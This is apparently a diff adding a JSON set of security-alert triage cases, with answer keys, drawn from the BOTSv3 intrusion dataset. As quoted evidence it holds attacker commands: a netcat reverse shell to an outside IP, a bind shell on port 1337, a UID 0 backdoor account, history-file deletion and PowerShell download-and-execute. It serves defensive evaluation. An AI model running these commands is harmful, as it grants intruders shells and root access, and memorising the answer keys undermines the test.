@@ -1,0 +1,398 @@
+{
+  "schema_version": 2,
+  "cases": [
+    {
+      "alert_id": "guardduty:s3-public-access",
+      "public": {
+        "provider": "guardduty",
+        "product": "Amazon GuardDuty",
+        "alert_type": "Policy:S3/BucketAnonymousAccessGranted",
+        "summary": "S3 bucket public access granted",
+        "description": "An S3 bucket ACL granted public read and write access.",
+        "severity": "medium",
+        "resource": "frothlywebcode",
+        "event_time": "2018-08-20 13:01:46",
+        "attributes": {"action": "PutBucketAcl", "bucket": "frothlywebcode", "grantee": "AllUsers", "permissions": ["READ", "WRITE"]}
+      },
+      "evidence": {
+        "object_key": "botsv3_2018-08-20_13.jsonl.gz",
+        "anchors": [{"time_prefix": "2018-08-20 13:01:46", "all_terms": ["PutBucketAcl", "frothlywebcode", "AllUsers", "READ", "WRITE"]}]
+      },
+      "oracle": {"determination": "true_positive", "incident_relevance": "related", "basis": "The exact CloudTrail record grants AllUsers read and write access to frothlywebcode.", "required_enrichments": []}
+    },
+    {
+      "alert_id": "guardduty:ec2-coinminer-dns",
+      "public": {
+        "provider": "guardduty",
+        "product": "Amazon GuardDuty",
+        "alert_type": "CryptoCurrency:EC2/BitcoinTool.B!DNS",
+        "summary": "Endpoint DNS request to cryptocurrency mining domain",
+        "description": "A Frothly endpoint resolved a Coinhive mining destination.",
+        "severity": "medium",
+        "resource": "BSTOLL-L",
+        "event_time": "2018-08-20 13:38:38",
+        "attributes": {"domain": "ws019.coinhive.com", "source_ip": "192.168.247.131"}
+      },
+      "evidence": {
+        "object_key": "botsv3_2018-08-20_13.jsonl.gz",
+        "anchors": [{"time_prefix": "2018-08-20 13:38:38", "all_terms": ["ws019.coinhive.com", "192.168.247.131", "BSTOLL-L"]}]
+      },
+      "oracle": {"determination": "true_positive", "incident_relevance": "related", "basis": "The endpoint resolves and connects to a Coinhive mining destination.", "required_enrichments": ["urlscan", "virustotal"], "enrichment_targets": ["ws019.coinhive.com"]}
+    },
+    {
+      "alert_id": "guardduty:c2-contact",
+      "public": {
+        "provider": "guardduty",
+        "product": "Amazon GuardDuty",
+        "alert_type": "Backdoor:EC2/C&CActivity.B!DNS",
+        "summary": "Endpoint contacted command-and-control infrastructure",
+        "description": "A PowerShell payload contacted external command-and-control infrastructure.",
+        "severity": "high",
+        "resource": "45.77.53.176",
+        "event_time": "2018-08-20 10:07:03",
+        "attributes": {"remote_ip": "45.77.53.176", "remote_port": 443, "path": "/admin/get.php"}
+      },
+      "evidence": {
+        "object_key": "botsv3_2018-08-20_10.jsonl.gz",
+        "anchors": [{"time_prefix": "2018-08-20 10:07:03", "all_terms": ["45.77.53.176", "/admin/get.php", "DownloadData", "IEX"]}]
+      },
+      "oracle": {"determination": "true_positive", "incident_relevance": "related", "basis": "The decoded PowerShell command downloads and executes content from the C2 endpoint.", "required_enrichments": ["urlscan", "virustotal"], "enrichment_targets": ["45.77.53.176"]}
+    },
+    {
+      "alert_id": "wiz_defend:coinminer-runtime",
+      "public": {
+        "provider": "wiz",
+        "product": "Wiz Defend",
+        "alert_type": "wiz.defend",
+        "summary": "Runtime cryptocurrency miner behavior",
+        "description": "A browser process reached 100 percent CPU immediately before Coinhive DNS activity.",
+        "severity": "high",
+        "resource": "BSTOLL-L",
+        "event_time": "2018-08-20 13:37:50",
+        "attributes": {"process": "chrome#5", "cpu_percent": 100, "domain": "ws019.coinhive.com"}
+      },
+      "evidence": {
+        "object_key": "botsv3_2018-08-20_13.jsonl.gz",
+        "anchors": [
+          {"time_prefix": "2018-08-20 13:37:50", "all_terms": ["chrome#5\t100\t100"]},
+          {"time_prefix": "2018-08-20 13:38:38", "all_terms": ["ws019.coinhive.com", "192.168.247.131", "BSTOLL-L"]}
+        ]
+      },
+      "oracle": {"determination": "true_positive", "incident_relevance": "related", "basis": "The same evidence object contains a 100 percent CPU browser process and immediate Coinhive DNS activity.", "required_enrichments": []}
+    },
+    {
+      "alert_id": "wiz_defend:linux-rce-c2",
+      "public": {
+        "provider": "wiz",
+        "product": "Wiz Defend",
+        "alert_type": "wiz.defend",
+        "summary": "Runtime command execution with external C2",
+        "description": "A command executed through the Struts application opened a reverse shell to an external host.",
+        "severity": "critical",
+        "resource": "hoth",
+        "event_time": "2018-08-20 11:13:58",
+        "attributes": {"application_path": "/frothlyinventory/showcase.action", "command": "/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe", "remote_ip": "45.77.53.176"}
+      },
+      "evidence": {
+        "object_key": "botsv3_2018-08-20_11.jsonl.gz",
+        "anchors": [{"time_prefix": "2018-08-20 11:13:58", "all_terms": ["showcase.action", "/bin/sh 0</tmp/backpipe", "nc 45.77.53.176 8088"]}]
+      },
+      "oracle": {"determination": "true_positive", "incident_relevance": "related", "basis": "The process command line records remote Struts execution of a reverse shell.", "required_enrichments": ["urlscan", "virustotal"], "enrichment_targets": ["45.77.53.176"]}
+    },
+    {
+      "alert_id": "wiz_vulnerability:linux-cves",
+      "public": {
+        "provider": "wiz",
+        "product": "Wiz Vulnerability",
+        "alert_type": "wiz.vulnerability",
+        "summary": "Linux exploit source staged and compiled",
+        "description": "Exploit source was created and compiled on the compromised Linux host.",
+        "severity": "critical",
+        "resource": "hoth",
+        "event_time": "2018-08-20 11:13:58",
+        "attributes": {"source_path": "/tmp/colonel.c", "compile_command": "gcc colonel.c -o colonelnew"}
+      },
+      "evidence": {
+        "object_key": "botsv3_2018-08-20_11.jsonl.gz",
+        "anchors": [
+          {"time_prefix": "2018-08-20 11:13:58", "all_terms": ["hostIdentifier\":\"hoth", "/tmp/colonel.c", "UPDATED"]},
+          {"time_prefix": "2018-08-20 11:15:01.090", "all_terms": ["hostIdentifier\":\"hoth", "gcc", "colonel.c", "colonelnew"]}
+        ]
+      },
+      "oracle": {"determination": "true_positive", "incident_relevance": "related", "basis": "File-integrity and process events show exploit source staged and compiled by tomcat8 on hoth.", "required_enrichments": []}
+    },
+    {
+      "alert_id": "wiz_issue:public-s3-exposure",
+      "public": {
+        "provider": "wiz",
+        "product": "Wiz Issue",
+        "alert_type": "wiz.issue",
+        "summary": "Public cloud storage exposed",
+        "description": "An S3 bucket ACL grants public read and write access.",
+        "severity": "high",
+        "resource": "frothlywebcode",
+        "event_time": "2018-08-20 13:01:46",
+        "attributes": {"action": "PutBucketAcl", "bucket": "frothlywebcode", "grantee": "AllUsers", "permissions": ["READ", "WRITE"]}
+      },
+      "evidence": {
+        "object_key": "botsv3_2018-08-20_13.jsonl.gz",
+        "anchors": [{"time_prefix": "2018-08-20 13:01:46", "all_terms": ["PutBucketAcl", "frothlywebcode", "AllUsers", "READ", "WRITE"]}]
+      },
+      "oracle": {"determination": "true_positive", "incident_relevance": "related", "basis": "The exact CloudTrail record grants AllUsers read and write access to frothlywebcode.", "required_enrichments": []}
+    },
+    {
+      "alert_id": "defender_cloud:linux-history-cleared",
+      "public": {
+        "provider": "defender_cloud",
+        "product": "Microsoft Defender for Cloud",
+        "alert_type": "A history file has been cleared",
+        "summary": "Linux history file cleared",
+        "description": "Root removed the Tomcat user's shell-history file on the compromised host.",
+        "severity": "medium",
+        "resource": "hoth",
+        "event_time": "2018-08-20 11:48:17.180",
+        "attributes": {"user": "root", "command": "rm /usr/share/tomcat8/.bash_history"}
+      },
+      "evidence": {
+        "object_key": "botsv3_2018-08-20_11.jsonl.gz",
+        "anchors": [{"time_prefix": "2018-08-20 11:48:17.180", "all_terms": ["hostIdentifier\":\"hoth", "rm", "/usr/share/tomcat8/.bash_history"]}]
+      },
+      "oracle": {"determination": "true_positive", "incident_relevance": "related", "basis": "A root process event records removal of the compromised service account's history file.", "required_enrichments": []}
+    },
+    {
+      "alert_id": "defender_cloud:linux-suspicious-network",
+      "public": {
+        "provider": "defender_cloud",
+        "product": "Microsoft Defender for Cloud",
+        "alert_type": "Detected suspicious network activity",
+        "summary": "Suspicious Linux network activity",
+        "description": "A command executed through the web application opened a reverse shell.",
+        "severity": "high",
+        "resource": "hoth",
+        "event_time": "2018-08-20 11:13:58",
+        "attributes": {"command": "/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe", "remote_ip": "45.77.53.176", "remote_port": 8088}
+      },
+      "evidence": {
+        "object_key": "botsv3_2018-08-20_11.jsonl.gz",
+        "anchors": [{"time_prefix": "2018-08-20 11:13:58", "all_terms": ["showcase.action", "/bin/sh 0</tmp/backpipe", "nc 45.77.53.176 8088"]}]
+      },
+      "oracle": {"determination": "true_positive", "incident_relevance": "related", "basis": "The process command line records a reverse shell to the external host.", "required_enrichments": ["urlscan", "virustotal"], "enrichment_targets": ["45.77.53.176"]}
+    },
+    {
+      "alert_id": "sigma:m365-onedrive-lnk-upload",
+      "public": {
+        "provider": "sigma",
+        "product": "SIEM Sigma",
+        "alert_type": "Suspicious OneDrive Link File Upload",
+        "summary": "Suspicious OneDrive link file upload",
+        "description": "The alert claims that a suspicious LNK file was uploaded to OneDrive.",
+        "severity": "high",
+        "resource": "BRUCE BIRTHDAY HAPPY HOUR PICS.lnk",
+        "event_time": "2018-08-20 09:59:18",
+        "attributes": {"claimed_operation": "FileUploaded", "file_name": "BRUCE BIRTHDAY HAPPY HOUR PICS.lnk"}
+      },
+      "evidence": {
+        "object_key": "botsv3_2018-08-20_10.jsonl.gz",
+        "anchors": [{"time_prefix": "2018-08-20 10:13:03", "all_terms": ["8046901d-ef1c-4d10-ab5d-08d5f25d176c", "BRUCE BIRTHDAY HAPPY HOUR PICS.lnk", "AnonymousLinkUsed", "91.207.175.56", "OneDrive"]}],
+        "absent_events": [{"fields": {"Operation": "FileUploaded", "SourceFileName": "BRUCE BIRTHDAY HAPPY HOUR PICS.lnk"}}]
+      },
+      "oracle": {"determination": "false_positive", "incident_relevance": "related", "basis": "The incident-related LNK exists, but the exact event is AnonymousLinkUsed; no FileUploaded event exists for this file.", "required_enrichments": []}
+    },
+    {
+      "alert_id": "sigma:m365-onedrive-unusual-user-agent",
+      "public": {
+        "provider": "sigma",
+        "product": "SIEM Sigma",
+        "alert_type": "Unusual Microsoft 365 User Agent",
+        "summary": "Unusual Microsoft 365 user agent",
+        "description": "A successful cloud login used an unusual browser from an external address.",
+        "severity": "low",
+        "resource": "bgist@froth.ly",
+        "event_time": "2018-08-20 09:51:37",
+        "attributes": {"user": "bgist@froth.ly", "source_ip": "104.207.83.63", "user_agent": "NaenaraBrowser/3.5b4"}
+      },
+      "evidence": {
+        "object_key": "botsv3_2018-08-20_00.jsonl.gz",
+        "anchors": [{"time_prefix": "2018-08-20 00:00:16", "all_terms": ["bgist@froth.ly", "104.207.83.63", "NaenaraBrowser/3.5b4", "UserLoggedIn"]}]
+      },
+      "oracle": {"determination": "true_positive", "incident_relevance": "related", "basis": "The audit event records the unusual browser and external source on the compromised user's login.", "required_enrichments": []}
+    },
+    {
+      "alert_id": "sigma:m365-link-file-used",
+      "public": {
+        "provider": "sigma",
+        "product": "SIEM Sigma",
+        "alert_type": "Suspicious Link File Accessed",
+        "summary": "Suspicious link file used",
+        "description": "An anonymous user accessed the malicious LNK through OneDrive.",
+        "severity": "medium",
+        "resource": "BRUCE BIRTHDAY HAPPY HOUR PICS.lnk",
+        "event_time": "2018-08-20 09:59:18",
+        "attributes": {"operation": "AnonymousLinkUsed", "file_name": "BRUCE BIRTHDAY HAPPY HOUR PICS.lnk", "client_ip": "91.207.175.56"}
+      },
+      "evidence": {
+        "object_key": "botsv3_2018-08-20_10.jsonl.gz",
+        "anchors": [{"time_prefix": "2018-08-20 10:13:03", "all_terms": ["8046901d-ef1c-4d10-ab5d-08d5f25d176c", "BRUCE BIRTHDAY HAPPY HOUR PICS.lnk", "AnonymousLinkUsed", "91.207.175.56", "OneDrive"]}]
+      },
+      "oracle": {"determination": "true_positive", "incident_relevance": "related", "basis": "The OneDrive audit event records AnonymousLinkUsed for the malicious LNK.", "required_enrichments": []}
+    },
+    {
+      "alert_id": "sigma:m365-inbox-rule-forward-external",
+      "public": {
+        "provider": "sigma",
+        "product": "SIEM Sigma",
+        "alert_type": "External Mail Forwarding Rule",
+        "summary": "External mailbox forwarding rule",
+        "description": "A user created an enforced blind-copy rule to an external mailbox.",
+        "severity": "high",
+        "resource": "hyunki1984@naver.com",
+        "event_time": "2018-08-20 11:21:40",
+        "attributes": {"actor": "fyodor@froth.ly", "operation": "New-TransportRule", "name": "SOX", "blind_copy_to": "hyunki1984@naver.com", "source_ip": "199.66.91.253"}
+      },
+      "evidence": {
+        "object_key": "botsv3_2018-08-20_11.jsonl.gz",
+        "anchors": [{"time_prefix": "2018-08-20 11:21:40", "all_terms": ["New-TransportRule", "BlindCopyTo", "hyunki1984@naver.com", "SOX", "199.66.91.253"]}]
+      },
+      "oracle": {"determination": "true_positive", "incident_relevance": "related", "basis": "The Exchange audit event records the malicious enforced blind-copy rule.", "required_enrichments": []}
+    },
+    {
+      "alert_id": "sigma:m365-sensitive-mail-search",
+      "public": {
+        "provider": "sigma",
+        "product": "SIEM Sigma",
+        "alert_type": "Suspicious Mail Search Terms",
+        "summary": "Sensitive mail search terms",
+        "description": "A compromised cloud user searched all mailboxes for sensitive business terms.",
+        "severity": "medium",
+        "resource": "fyodor@froth.ly",
+        "event_time": "2018-08-20 10:48:28",
+        "attributes": {"operation": "New-MailboxSearch", "query": "cromdale OR beer OR financial OR secret", "source_ip": "104.207.83.63"}
+      },
+      "evidence": {
+        "object_key": "botsv3_2018-08-20_11.jsonl.gz",
+        "anchors": [{"time_prefix": "2018-08-20 11:04:01", "all_terms": ["New-MailboxSearch", "cromdale OR beer OR financial OR secret", "fyodor@froth.ly", "104.207.83.63"]}]
+      },
+      "oracle": {"determination": "true_positive", "incident_relevance": "related", "basis": "The Exchange audit event records the sensitive all-mailbox search by the compromised user.", "required_enrichments": []}
+    },
+    {
+      "alert_id": "sigma:m365-aad-account-disabled",
+      "public": {
+        "provider": "sigma",
+        "product": "SIEM Sigma",
+        "alert_type": "Azure AD Account Disabled",
+        "summary": "Azure AD account disabled",
+        "description": "A compromised user successfully disabled another Frothly account.",
+        "severity": "low",
+        "resource": "bgist@froth.ly",
+        "event_time": "2018-08-20 14:47:12.515",
+        "attributes": {"actor": "fyodor@froth.ly", "target": "bgist@froth.ly", "property": "AccountEnabled", "old_value": true, "new_value": false}
+      },
+      "evidence": {
+        "object_key": "botsv3_2018-08-20_14.jsonl.gz",
+        "anchors": [{"time_prefix": "2018-08-20 14:47:12.515", "all_terms": ["Directory_FE2NN_24703906", "Disable account", "bgist@froth.ly", "fyodor@froth.ly", "AccountEnabled", "[true]", "[false]", "Success"]}]
+      },
+      "oracle": {"determination": "true_positive", "incident_relevance": "related", "basis": "The directory audit record shows the compromised actor successfully changed AccountEnabled from true to false.", "required_enrichments": []}
+    },
+    {
+      "alert_id": "sigma:web-password-spray",
+      "public": {
+        "provider": "sigma",
+        "product": "SIEM Sigma",
+        "alert_type": "Internet Password Spray",
+        "summary": "Internet password spray against a Frothly server",
+        "description": "An external host attempted multiple invalid SSH usernames against a Frothly server.",
+        "severity": "medium",
+        "resource": "5.101.40.81",
+        "event_time": "2018-08-20 15:07:01.070",
+        "attributes": {"source_ip": "5.101.40.81", "service": "ssh", "usernames": ["camera", "default"]}
+      },
+      "evidence": {
+        "object_key": "botsv3_2018-08-20_15.jsonl.gz",
+        "anchors": [
+          {"time_prefix": "2018-08-20 15:07:01.070", "all_terms": ["Invalid user camera from 5.101.40.81"]},
+          {"time_prefix": "2018-08-20 15:08:11.140", "all_terms": ["Invalid user default from 5.101.40.81"]}
+        ]
+      },
+      "oracle": {"determination": "true_positive", "incident_relevance": "unrelated", "basis": "The SSH daemon records a real external username spray, but the source is not part of the main BOTSv3 intrusion chain.", "required_enrichments": ["urlscan", "virustotal"], "enrichment_targets": ["5.101.40.81"]}
+    },
+    {
+      "alert_id": "sigma:endpoint-hxtsr-from-macro",
+      "public": {
+        "provider": "sigma",
+        "product": "SIEM Sigma",
+        "alert_type": "Suspicious Process From Macro Document",
+        "summary": "Suspicious process spawned from macro document",
+        "description": "The alert claims that HxTsr.exe was spawned from a macro-enabled document.",
+        "severity": "high",
+        "resource": "HxTsr.exe",
+        "event_time": "2018-08-18 15:03:10.484",
+        "attributes": {"process": "HxTsr.exe", "claimed_parent": "macro-enabled Office document"}
+      },
+      "evidence": {
+        "object_key": "botsv3_2018-08-18_15.jsonl.gz",
+        "anchors": [{"time_prefix": "2018-08-18 15:03:10.484", "all_terms": ["WindowsApps", "HxTsr.exe", "Creator Process Name:\tC:\\Windows\\System32\\svchost.exe", "-ServerName:Hx.IPC.Server"]}]
+      },
+      "oracle": {"determination": "false_positive", "incident_relevance": "unrelated", "basis": "The process is the Windows communications app launched by svchost; no Office or macro lineage is present.", "required_enrichments": []}
+    },
+    {
+      "alert_id": "sigma:endpoint-hdoor-network-scan",
+      "public": {
+        "provider": "sigma",
+        "product": "SIEM Sigma",
+        "alert_type": "Endpoint Network Scan Tool",
+        "summary": "Endpoint network scan tool",
+        "description": "A compromised endpoint launched hdoor.exe across an internal address range.",
+        "severity": "high",
+        "resource": "hdoor.exe",
+        "event_time": "2018-08-20 10:43:11",
+        "attributes": {"host": "FYODOR-L", "process": "hdoor.exe", "arguments": "-hbs 192.168.9.1-192.168.9.50 /b /m /n", "parent": "powershell.exe", "md5": "586EF56F4D8963DD546163AC31C865D7"}
+      },
+      "evidence": {
+        "object_key": "botsv3_2018-08-20_10.jsonl.gz",
+        "anchors": [{"time_prefix": "2018-08-20 10:43:11", "all_terms": ["FYODOR-L", "hdoor.exe", "192.168.9.1-192.168.9.50", "powershell.exe", "586EF56F4D8963DD546163AC31C865D7"]}]
+      },
+      "oracle": {"determination": "true_positive", "incident_relevance": "related", "basis": "The endpoint event records hdoor launched by PowerShell with an internal scan range and the known artifact hash.", "required_enrichments": []}
+    },
+    {
+      "alert_id": "sigma:linux-netcat-listener",
+      "public": {
+        "provider": "sigma",
+        "product": "SIEM Sigma",
+        "alert_type": "Netcat Listener On Unusual Port",
+        "summary": "Netcat listener on unusual port",
+        "description": "A root-owned Netcat process exposed a shell on TCP port 1337.",
+        "severity": "high",
+        "resource": "hoth:1337",
+        "event_time": "2018-08-18 12:29:11.036",
+        "attributes": {"pid": 14356, "process": "netcat", "arguments": "-v -l -p 1337 -e /bin/bash"}
+      },
+      "evidence": {
+        "object_key": "botsv3_2018-08-18_12.jsonl.gz",
+        "anchors": [{"time_prefix": "2018-08-18 12:29:11.036", "all_terms": ["14356", "netcat", "-v_-l_-p_1337_-e_/bin/bash"]}]
+      },
+      "oracle": {"determination": "true_positive", "incident_relevance": "related", "basis": "The process listing records a root-owned Netcat listener executing /bin/bash on port 1337.", "required_enrichments": []}
+    },
+    {
+      "alert_id": "sigma:linux-uid0-user-created",
+      "public": {
+        "provider": "sigma",
+        "product": "SIEM Sigma",
+        "alert_type": "Linux UID 0 User Created",
+        "summary": "Linux UID 0 user created",
+        "description": "A remote command created a new Linux account with UID and GID zero.",
+        "severity": "critical",
+        "resource": "tomcat7",
+        "event_time": "2018-08-20 11:07:01",
+        "attributes": {"command": "useradd -ou 0 -g 0 -M -N -r -s /bin/bash tomcat7", "uid": 0, "gid": 0}
+      },
+      "evidence": {
+        "object_key": "botsv3_2018-08-20_11.jsonl.gz",
+        "anchors": [
+          {"time_prefix": "2018-08-20 11:07:01", "all_terms": ["RecordNumber=279026", "showcase.action", "useradd -ou 0", "tomcat7"]},
+          {"time_prefix": "2018-08-20 11:24:43", "all_terms": ["new user", "name=tomcat7", "UID=0", "GID=0"]}
+        ]
+      },
+      "oracle": {"determination": "true_positive", "incident_relevance": "related", "basis": "The remote command and Linux account log jointly prove successful creation of a UID 0 account.", "required_enrichments": []}
+    }
+  ]
+}
